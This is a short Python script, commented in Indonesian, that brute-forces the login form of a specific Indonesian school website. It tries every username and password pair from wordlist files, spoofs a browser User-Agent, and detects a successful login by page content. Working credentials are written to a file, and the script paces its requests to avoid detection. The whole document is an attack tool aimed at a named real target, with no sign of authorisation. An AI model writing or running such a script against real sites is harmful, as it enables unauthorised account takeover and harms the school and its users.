import requests
import time

# Target URL
url = "https://hultahmadrasahnwdi.smknwanjanionline.sch.id/public/login"

# Baca wordlist
with open("usernames.txt", "r") as u:
    usernames = [line.strip() for line in u.readlines()]

with open("passwords.txt", "r") as p:
    passwords = [line.strip() for line in p.readlines()]

# Header opsional (untuk menyamar sebagai browser)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# Loop brute force
for username in usernames:
    for password in passwords:
        # Data POST
        data = {
            "email": username,
            "password": password
        }

        try:
            response = requests.post(url, data=data, headers=headers, timeout=10)
            
            # Cek keberhasilan (sesuaikan dengan kondisi target)
            if "dashboard" in response.url or "selamat datang" in response.text.lower():
                print(f"\n🎉 [SUCCESS] Username: {username} | Password: {password}")
                with open("hasil_sukses.txt", "a") as f:
                    f.write(f"{username}:{password}\n")
                break  # lanjut ke username berikutnya
            else:
                print(f"[FAILED] {username}:{password}")

        except Exception as e:
            print(f"[ERROR] {username}:{password} -> {str(e)}")

        # Jeda agar tidak terlalu cepat (hindari deteksi & overload)
        time.sleep(1)

print("\n✅ Proses brute force selesai.")